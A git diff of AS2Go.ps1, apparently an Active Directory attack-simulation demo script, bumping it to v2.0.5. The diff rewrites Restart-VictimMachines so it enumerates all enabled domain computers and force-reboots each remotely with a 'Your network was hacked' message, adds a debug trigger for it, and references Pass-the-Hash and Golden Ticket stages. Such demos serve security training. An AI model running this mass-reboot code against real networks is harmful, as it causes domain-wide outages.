@@ -31,13 +31,14 @@ PS> .\AS2Go.ps1
 
 
 .LINK
-https://HerrHoZi.com
+https://herrHoZi.com
 
 
 #>
 
 
 #change log
+# 2022-01-21 | v2.0.5 |  Update Function Restart-VictimMachines
 # 2022-01-18 | v2.0.4 |  Update Function SimulateRansomare
 # 2022-01-11 | v2.0.3 |  Add    Function SimulateRansomare
 
@@ -54,8 +55,8 @@ https://HerrHoZi.com
 ######                                                                     #####
 ################################################################################
 
-$lastupdate   = "2022-01-18"
-$version      = "2.0.4.000" 
+$lastupdate   = "2022-01-21"
+$version      = "2.0.5.000" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -67,6 +68,7 @@ $yes  = "Y"
 $no   = "N"
 $PtH  = "H"
 $PtT  = "T"
+$debug = "D"
 $GoldenTicket = "GT"
 $InitialStart = "Start"
 $PrivledgeAccount = $no
@@ -342,26 +344,68 @@ $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 #####
 
+Write-Host "____________________________________________________________________`n" 
+Write-Host "       TRY to reboot the following computers                         "
+Write-Host "____________________________________________________________________`n`n" 
 
-    $commment = "Usecase $UseCase | Your network was hacked. All machines will be rebooted in $time2reboot seconds!!!!"
+Get-ADComputer -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties * | Select -Property Name,DNSHostName,Enabled,LastLogonDate,operatingSystem | Ft
 
-      try
-        {
-        # only for Windows 10 machines
-        #https://www.windowscentral.com/how-remote-shutdown-computer-windows-10
-        $Win10Maschine = "$mySAW"
-        net use \\$Win10Maschine\ipc$
-        shutdown /r /f /c $commment /t $time2reboot /m \\$Win10Maschine
-        }
-      catch
-        {
-        # do nothing
-        }        
-        
-        shutdown /r /f /c $commment /t $time2reboot /m \\$mydc
-        shutdown /r /f /c $commment /t $time2reboot /m \\$myViPC
-        shutdown /r /f /c $commment /t $time2reboot /m \\$myAppServer
-        shutdown /r /f /c $commment /t $time2reboot /m \\$mySAW
+
+$commment = "Use case $UseCase | Your network was hacked. All machines will be rebooted in $time2reboot seconds!!!!"
+
+
+Write-Host "`nusing: shutdown /r /f /c $commment /t $time2reboot /m \\<remotemachine>`n"
+
+
+# enumerate all enabled computer accounts 
+$computers = Get-ADComputer -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties * | Select -Property Name,DNSHostName,Enabled,LastLogonDate,operatingSystem
+pause
+
+# check if the computer is online
+#$time2reboot = 99
+#$UseCase = "TEST"
+
+
+foreach ( $computer in $computers)
+{
+   $remotemachine =  $computer.name
+   $os = $computer.operatingSystem
+
+   # check if the computer is online
+   IF (Test-Connection -BufferSize 32 -Count 1 -ComputerName $remotemachine -Quiet) 
+       {
+
+       If ($env:COMPUTERNAME -ne $computer.name)
+          {
+          If ($os -like 'Windows 1*')
+             {
+             # only for Windows 10 machines
+             Write-Host "Try to reboot Windows PC     - $remotemachine"
+             net use \\$remotemachine\ipc$
+             shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
+             }
+          elseif ($os -like 'Windows 7*')
+             {
+             Write-Host "Try to reboot Windows PC     - $remotemachine"
+             shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
+             }
+          else
+            {
+            Write-Host "Try to reboot Windows Server - $remotemachine"
+            shutdown /r /f /c $commment /t $time2reboot /m \\$remotemachine
+            }
+         }
+       } #end if Test-Connection
+   Else 
+      {
+     Write-Warning "The remote machine $remotemachine is Down"
+      } 
+
+} #end forach
+
+
+# last, but not least
+shutdown /r /f /c $commment /t $time2reboot /m \\$env:COMPUTERNAME
 
 
 
@@ -1464,7 +1508,10 @@ Write-Host "____________________________________________________________________
 
 Write-Host "Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName" -ForegroundColor $global:FGCCommand
 Write-Host ""
-Get-ADComputer -Filter * | ft Name, Enabled, DistinguishedName
+
+# enumerate all computer accounts 
+Get-ADComputer -Filter * -Properties * | Select -Property Name,DNSHostName,Enabled,LastLogonDate,operatingSystem | ft
+
 
 
 Write-Host ""
@@ -1878,6 +1925,21 @@ else
     Set-NewColorSchema -NewStage $InitialStart
 }
 
+
+# only for PosH Script testing
+If ($answer -eq $debug)
+
+{
+
+Restart-VictimMachines
+
+}
+
+
+
+
+
+
 #Pause
 Show-Step -step $UserPic
 Start-NetSess -server $myDC
@@ -2231,8 +2293,8 @@ Write-Host "____________________________________________________________________
 
 ################################################################################
 ######                                                                     #####
-######                         CLEAN UP                                    #####
-#####                                                                      #####
+#"#####                         CLEAN UP                                         "
+######                                                                     #####
 ################################################################################
 
 Stop-AS2GoDemo
